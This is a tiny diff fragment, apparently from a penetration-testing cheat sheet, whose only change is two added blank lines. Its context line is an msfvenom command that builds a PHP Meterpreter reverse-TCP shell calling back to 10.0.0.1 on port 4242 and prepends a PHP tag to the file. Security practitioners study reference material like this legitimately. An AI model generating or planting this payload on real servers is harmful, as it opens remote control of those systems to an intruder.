@@ -16,3 +16,5 @@ updated_at: '2023-04-10T20:25:33.111197+00:00'
 ```bash
 $ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
 ```
+
+
